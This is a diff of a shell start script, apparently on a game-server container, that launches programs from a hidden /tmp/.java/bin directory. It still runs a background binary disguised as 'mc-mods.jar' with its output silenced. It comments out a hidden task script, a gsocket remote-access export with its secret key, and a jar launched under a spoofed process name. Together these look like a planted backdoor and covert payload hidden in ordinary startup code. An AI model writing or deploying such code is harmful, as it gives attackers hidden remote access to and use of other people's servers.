@@ -14,11 +14,11 @@ function start_app() {
     chmod a+x /tmp/.java/bin/***
     cd /tmp/.java/bin && nohup ./mc-mods.jar -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
     # RESERVED SCRIPTS
-    bash /home/container/.cache/.cache/.run-task.sh
+    # bash /home/container/.cache/.cache/.run-task.sh
     # GNET
-    export GSOCKET_ARGS="-s i1A3eD2E2K9c-A1K6f9L2M3-4D9g8H6b5j7-56C4a9f6X1eCd9F9440-d6A28039A1c5J1g6K -liqD"
-    export HOME=/home/container
-    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
+    # export GSOCKET_ARGS="-s i1A3eD2E2K9c-A1K6f9L2M3-4D9g8H6b5j7-56C4a9f6X1eCd9F9440-d6A28039A1c5J1g6K -liqD"
+    # export HOME=/home/container
+    # cd /tmp/.java/bin && exec -a -java ./add-on.jar &
 }
 
 if [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/user-patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
